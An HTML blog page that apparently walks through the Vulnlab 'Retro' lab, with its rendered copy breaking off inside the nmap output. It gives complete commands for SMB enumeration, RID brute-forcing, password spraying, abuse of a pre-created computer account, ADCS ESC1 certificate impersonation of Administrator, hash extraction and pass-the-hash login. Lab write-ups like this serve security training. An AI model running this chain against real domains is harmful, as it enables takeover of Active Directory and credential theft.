<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Retro Vulnlab | Shelldon's blog</title>
<meta name=keywords content="ADCS"><meta name=description content="TLDR NmapðŸ”—
SMB enumðŸ”—
Users list dumpðŸ”—
Diving to pre created computer accountðŸ”—
ADCSðŸ”—
Exploitation of ESC1ðŸ”—
Welcome to the 1st part of Red Team series!
In these series I will write some interesting details/attacks which will help in Red Team projects.
In this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.
Nmap Using nmap we can scan the machine to understand which ports/services are open"><meta name=author content="Shelldon"><link rel=canonical href=http://localhost:1313/posts/retro/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.1fa9b2f9d71288e3adc6e7337b3abeb5b9b1b58000345713ddb67551813bde0f.css integrity="sha256-H6my+dcSiOOtxuczezq+tbmxtYAANFcT3bZ1UYE73g8=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/retro/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Retro Vulnlab"><meta property="og:description" content="TLDR NmapðŸ”—
SMB enumðŸ”—
Users list dumpðŸ”—
Diving to pre created computer accountðŸ”—
ADCSðŸ”—
Exploitation of ESC1ðŸ”—
Welcome to the 1st part of Red Team series!
In these series I will write some interesting details/attacks which will help in Red Team projects.
In this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.
Nmap Using nmap we can scan the machine to understand which ports/services are open"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/retro/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-23T11:47:18-04:00"><meta property="article:modified_time" content="2024-10-23T11:47:18-04:00"><meta property="og:site_name" content="Shelldon's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Retro Vulnlab"><meta name=twitter:description content="TLDR NmapðŸ”—
SMB enumðŸ”—
Users list dumpðŸ”—
Diving to pre created computer accountðŸ”—
ADCSðŸ”—
Exploitation of ESC1ðŸ”—
Welcome to the 1st part of Red Team series!
In these series I will write some interesting details/attacks which will help in Red Team projects.
In this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.
Nmap Using nmap we can scan the machine to understand which ports/services are open"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Retro Vulnlab","item":"http://localhost:1313/posts/retro/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Retro Vulnlab","name":"Retro Vulnlab","description":"TLDR NmapðŸ”—\nSMB enumðŸ”—\nUsers list dumpðŸ”—\nDiving to pre created computer accountðŸ”—\nADCSðŸ”—\nExploitation of ESC1ðŸ”—\nWelcome to the 1st part of Red Team series!\nIn these series I will write some interesting details/attacks which will help in Red Team projects.\nIn this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.\nNmap Using nmap we can scan the machine to understand which ports/services are open","keywords":["ADCS"],"articleBody":"TLDR NmapðŸ”—\nSMB enumðŸ”—\nUsers list dumpðŸ”—\nDiving to pre created computer accountðŸ”—\nADCSðŸ”—\nExploitation of ESC1ðŸ”—\nWelcome to the 1st part of Red Team series!\nIn these series I will write some interesting details/attacks which will help in Red Team projects.\nIn this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.\nNmap Using nmap we can scan the machine to understand which ports/services are open\nnmap -sC -sV -T4 -oN nmap.txt 10.10.81.246 After getting results we can see ports/services on the host\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 13:09 EDT Nmap scan report for 10.10.81.246 Host is up (0.10s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-23 17:09:57Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:DC.retro.vl | Not valid before: 2024-10-23T16:58:37 |_Not valid after: 2025-10-23T16:58:37 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:DC.retro.vl | Not valid before: 2024-10-23T16:58:37 |_Not valid after: 2025-10-23T16:58:37 |_ssl-date: TLS randomness does not represent time 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:DC.retro.vl | Not valid before: 2024-10-23T16:58:37 |_Not valid after: 2025-10-23T16:58:37 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC.retro.vl | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u003cunsupported\u003e, DNS:DC.retro.vl | Not valid before: 2024-10-23T16:58:37 |_Not valid after: 2025-10-23T16:58:37 |_ssl-date: TLS randomness does not represent time 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.retro.vl | Not valid before: 2024-10-22T17:07:20 |_Not valid after: 2025-04-23T17:07:20 | rdp-ntlm-info: | Target_Name: RETRO | NetBIOS_Domain_Name: RETRO | NetBIOS_Computer_Name: DC | DNS_Domain_Name: retro.vl | DNS_Computer_Name: DC.retro.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-10-23T17:10:38+00:00 |_ssl-date: 2024-10-23T17:11:17+00:00; -1s from scanner time. Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-23T17:10:40 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.62 seconds So, it is a DC and has dc.retro.vl full name. We should add it to /etc/hosts file.\nAlso, we can see that in that host running kerberos, smb, ldap and rdp.\nSMB Enum Now we can start from enumeration of smb.\nUsing netexec we can enumerate shares.\nnetexec smb dc -u '' -p '' --shares As you can see we can perform null authenticating, but we can not access to the shares.\nInstead of we can try to use guest user (without password)\nnetexec smb dc -u 'guest' -p '' --shares Now we can enumerate the shares. There are possible methods:\nUsing netexecâ€™s spider_plus module; Using impacketâ€™s smbclient script; Using general smbclient tool. Letâ€™s try with impacket-smbclient.\nimpacket-smbclient retro.vl/guest@dc -no-pass Inside Trainees share we found Important.txt file. It is a message from admins.\nUsers List Dump Now letâ€™s try to dump list of users and try to spray usersnames as passwords. Maybe if we are lucky we will get a hit. Using â€“users option of netexec does not give anything\nnetexec smb dc -u 'guest' -p '' --users But, there is another method, which is bruting RIDs. Netexec hash a option â€“rid-brute maxRidValue. Letâ€™s try to use it.\nnetexec smb dc -u 'guest' -p '' --rid-brute 10000 Now we have a list of users, groups and aliasses. We need to geet a list users and we can use that command to get grep only users.\necho 'Content' | | cut -d '\\' -f2 | cut -f1 -d ' ' After getting the usernames lists we can perform spraying usernames.\nIn netexec just use users list as username and password.\nnetexec smb dc -u users.txt -p users.txt --continue-on-success --no-bruteforce We have one hit. User trainee has password trainee. So, it is time to enumerate using trainee user.\nnetexec smb dc -u trainee -p trainee --shares Trainee user has READ permissions for Notes share, which is interesting. Letâ€™s check using impacket-smbclient.\nimpacket-smbclient retro.vl/trainee:trainee@dc In the Notes share we see the ToDo.txt file. After reading it we can understand that there was an incident. Also, James talked about pre created computer account which sounds interesting.\nDiving to pre created computer account After some enumeration I found a post from trustedsec. After reading that post I found interesting that for the pre created computer account used password as the name of the pre created computer account. For example we have a computer account banking$, what if we will try to use the password banking. So, letâ€™s try.\nnetexec smb dc -u banking$ -p banking Nice!\nWe got an error STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT not like login failure or something like that. But how it can help us?\nADCS After a little bit enum, I found the adcs module of netexec.\nnetexec ldap dc -u trainee -p trainee -M adcs Interesting. We have ADCS on the DC. So, we can use certipy to get some information about the certificate center and maybe get some vulnerable templates.\ncertipy find -u trainee@retro.vl -p trainee -target dc.retro.vl -enabled -stdout -vulnerable And we found a vulnerable template and only Domain Computers can enroll it. So it is ESC1. After reading about ESC1 from certipyâ€™s github page I understand that we can request a certificate using -ca (Certificate Authority), -template (Template name) and -upn (Alternative UPN) (for me upn sounds like impersonation).\nNote that we can not just create a computer account and perform ESC1. The reason why is MachineAccountQuota is 0 which mean we can not create/add a computer account to the domain.\nExploitation of ESC1 Using certipy letâ€™s ask a certifcate and for the upn letâ€™s use Domain Administrator user.\ncertipy req -u 'banking$'@retro.vl -p banking -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096 But we saw an error rpc_s_access_denied which is similiar to netexec error for banking$ authentication.\nThe best options is just ask a TGT (Ticket Granting Ticket) ticket to banking$ user and using kerberos just perform ESC1 attack.\nimpacket-getTGT retro.vl/banking$:banking -dc-ip dc Awesome we got a tgt ticket and now it is time to back ESC1. But before we need to set a KRB5CCNAME local environment variable and use path to tgt (banking$.ccache) file.\nexport KRB5CCNAME=banking\\$.ccache certipy req -u 'banking$'@retro.vl -k -no-pass -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096 Boom! We got a certificate of Administrator user. To get a ntlm hash of that user we need to use auth module of certipy.\ncertipy auth -pfx administrator.pfx -domain retro.vl Awesome! Now we have a nt hash of domain Administrator, and we can just use psexec or wmiexec to read the flags\nimpacket-wmiexec retro.vl/Administrator@dc -hashes :252fac7066d93dd009d4fd2cd0368389 ","wordCount":"1186","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-23T11:47:18-04:00","dateModified":"2024-10-23T11:47:18-04:00","author":{"@type":"Person","name":"Shelldon"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/retro/"},"publisher":{"@type":"Organization","name":"Shelldon's blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/posts/ title=blog><span>blog</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Retro Vulnlab</h1><div class=post-meta><span title='2024-10-23 11:47:18 -0400 EDT'>October 23, 2024</span>&nbsp;Â·&nbsp;6 min&nbsp;Â·&nbsp;1186 words&nbsp;Â·&nbsp;Shelldon</div></header><div class=post-content><h2 id=tldr>TLDR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p><a href=#nmap>Nmap</a>ðŸ”—<br><a href=#smb-enum>SMB enum</a>ðŸ”—<br><a href=#users-list-dump>Users list dump</a>ðŸ”—<br><a href=#diving-to-pre-created-computer-account>Diving to pre created computer account</a>ðŸ”—<br><a href=#adcs>ADCS</a>ðŸ”—<br><a href=#exploitation-of-esc1>Exploitation of ESC1</a>ðŸ”—</p><p><br>Welcome to the 1st part of Red Team series!<br>In these series I will write some interesting details/attacks which will help in Red Team projects.</p><p><img loading=lazy src=Untitled.jpeg alt></p><p><br>In this post we will learn ADCS attack (ESC1) and pre-created computer accounts. Also little bit about kerberos and TGT ticket.</p><p><img loading=lazy src=icon.png alt="Alt Text"></p><h2 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h2><p>Using nmap we can scan the machine to understand which ports/services are open</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>nmap</span><span class=w> </span><span class=o>-</span><span class=n>sC</span><span class=w> </span><span class=o>-</span><span class=n>sV</span><span class=w> </span><span class=o>-</span><span class=n>T4</span><span class=w> </span><span class=o>-</span><span class=k>oN</span><span class=w> </span><span class=n>nmap</span><span class=p>.</span><span class=n>txt</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>81</span><span class=p>.</span><span class=mi>246</span><span class=w>
</span></span></span></code></pre></div><p>After getting results we can see ports/services on the host</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>Starting</span><span class=w> </span><span class=n>Nmap</span><span class=w> </span><span class=mi>7</span><span class=p>.</span><span class=mi>94</span><span class=n>SVN</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>nmap</span><span class=p>.</span><span class=n>org</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=k>at</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=w> </span><span class=mi>13</span><span class=p>:</span><span class=mi>09</span><span class=w> </span><span class=n>EDT</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Nmap</span><span class=w> </span><span class=n>scan</span><span class=w> </span><span class=n>report</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>10</span><span class=p>.</span><span class=mi>81</span><span class=p>.</span><span class=mi>246</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Host</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=n>up</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>10</span><span class=n>s</span><span class=w> </span><span class=n>latency</span><span class=p>).</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>Not</span><span class=w> </span><span class=n>shown</span><span class=p>:</span><span class=w> </span><span class=mi>988</span><span class=w> </span><span class=n>filtered</span><span class=w> </span><span class=n>tcp</span><span class=w> </span><span class=n>ports</span><span class=w> </span><span class=p>(</span><span class=k>no</span><span class=o>-</span><span class=n>response</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>PORT</span><span class=w>     </span><span class=k>STATE</span><span class=w> </span><span class=n>SERVICE</span><span class=w>       </span><span class=k>VERSION</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>53</span><span class=o>/</span><span class=n>tcp</span><span class=w>   </span><span class=k>open</span><span class=w>  </span><span class=k>domain</span><span class=w>        </span><span class=k>Simple</span><span class=w> </span><span class=n>DNS</span><span class=w> </span><span class=n>Plus</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>88</span><span class=o>/</span><span class=n>tcp</span><span class=w>   </span><span class=k>open</span><span class=w>  </span><span class=n>kerberos</span><span class=o>-</span><span class=n>sec</span><span class=w>  </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Kerberos</span><span class=w> </span><span class=p>(</span><span class=n>server</span><span class=w> </span><span class=n>time</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=w> </span><span class=mi>17</span><span class=p>:</span><span class=mi>09</span><span class=p>:</span><span class=mi>57</span><span class=n>Z</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>135</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>msrpc</span><span class=w>         </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>139</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>netbios</span><span class=o>-</span><span class=n>ssn</span><span class=w>   </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>netbios</span><span class=o>-</span><span class=n>ssn</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>389</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>ldap</span><span class=w>          </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Subject</span><span class=w> </span><span class=n>Alternative</span><span class=w> </span><span class=n>Name</span><span class=p>:</span><span class=w> </span><span class=n>othername</span><span class=p>:</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>311</span><span class=p>.</span><span class=mi>25</span><span class=p>.</span><span class=mi>1</span><span class=p>::</span><span class=o>&lt;</span><span class=n>unsupported</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>DNS</span><span class=p>:</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=n>TLS</span><span class=w> </span><span class=n>randomness</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>represent</span><span class=w> </span><span class=n>time</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>445</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>microsoft</span><span class=o>-</span><span class=n>ds</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>464</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>kpasswd5</span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>593</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>ncacn_http</span><span class=w>    </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>RPC</span><span class=w> </span><span class=n>over</span><span class=w> </span><span class=n>HTTP</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>636</span><span class=o>/</span><span class=n>tcp</span><span class=w>  </span><span class=k>open</span><span class=w>  </span><span class=n>ssl</span><span class=o>/</span><span class=n>ldap</span><span class=w>      </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Subject</span><span class=w> </span><span class=n>Alternative</span><span class=w> </span><span class=n>Name</span><span class=p>:</span><span class=w> </span><span class=n>othername</span><span class=p>:</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>311</span><span class=p>.</span><span class=mi>25</span><span class=p>.</span><span class=mi>1</span><span class=p>::</span><span class=o>&lt;</span><span class=n>unsupported</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>DNS</span><span class=p>:</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>before</span><span class=p>:</span><span class=w> </span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_Not</span><span class=w> </span><span class=k>valid</span><span class=w> </span><span class=k>after</span><span class=p>:</span><span class=w>  </span><span class=mi>2025</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>23</span><span class=n>T16</span><span class=p>:</span><span class=mi>58</span><span class=p>:</span><span class=mi>37</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=n>TLS</span><span class=w> </span><span class=n>randomness</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>represent</span><span class=w> </span><span class=n>time</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>3268</span><span class=o>/</span><span class=n>tcp</span><span class=w> </span><span class=k>open</span><span class=w>  </span><span class=n>ldap</span><span class=w>          </span><span class=n>Microsoft</span><span class=w> </span><span class=n>Windows</span><span class=w> </span><span class=n>Active</span><span class=w> </span><span class=n>Directory</span><span class=w> </span><span class=n>LDAP</span><span class=w> </span><span class=p>(</span><span class=k>Domain</span><span class=p>:</span><span class=w> </span><span class=n>retro</span><span class=p>.</span><span class=n>vl0</span><span class=p>.,</span><span class=w> </span><span class=n>Site</span><span class=p>:</span><span class=w> </span><span class=k>Default</span><span class=o>-</span><span class=k>First</span><span class=o>-</span><span class=n>Site</span><span class=o>-</span><span class=n>Name</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=n>_ssl</span><span class=o>-</span><span class=nb>date</span><span class=p>:</span><span class=w> </span><span class=n>TLS</span><span class=w> </span><span class=n>randomness</span><span class=w> </span><span class=n>does</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=n>represent</span><span class=w> </span><span class=n>time</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ssl</span><span class=o>-</span><span class=n>cert</span><span class=p>:</span><span class=w> </span><span class=n>Subject</span><span class=p>:</span><span class=w> </span><span class=n>commonName</span><span class=o>=</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Subject</span><span class=w> </span><span class=n>Alternative</span><span class=w> </span><span class=n>Name</span><span class=p>:</span><span class=w> </span><span class=n>othername</span><span class=p>:</span><span class=w> </span><span class=mi>1</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>1</span><span class=p>.</span><span class=mi>311</span><span class=p>.</span><span class=mi>25</span><span class=p>.</span><span class=mi>1</span><span class=p>::</span><span class=o>&lt;</span><span class=n>unsupported</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>DNS</span><span class=p>:</span><span class=n>DC</span><span class=p>.</span><span class=n>retro</span><span class=p>.</span><span class=n>vl</span><span class=w>
